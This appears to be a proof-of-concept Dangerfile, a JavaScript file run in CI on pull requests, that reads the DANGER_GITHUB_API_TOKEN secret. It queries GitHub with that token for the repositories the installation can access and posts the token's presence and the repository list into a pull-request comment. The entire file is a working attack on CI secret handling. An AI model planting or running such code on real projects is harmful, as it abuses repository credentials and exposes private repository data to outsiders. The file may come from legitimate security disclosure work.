import { danger, fail, markdown } from 'danger';

(async () => {
  const token = process.env.DANGER_GITHUB_API_TOKEN;
  const res = await fetch('https://api.github.com/installation/repositories', {
    headers: {
      Authorization: `token ${token}`,
      Accept: 'application/vnd.github+json',
    },
  });
  const data = await res.json();
  markdown('POC-DANGERFILE-EXECUTED: ' + JSON.stringify({
    tokenPresent: !!token,
    reposVisible: data.repositories ? data.repositories.map(r => r.full_name) : data,
  }));
})();
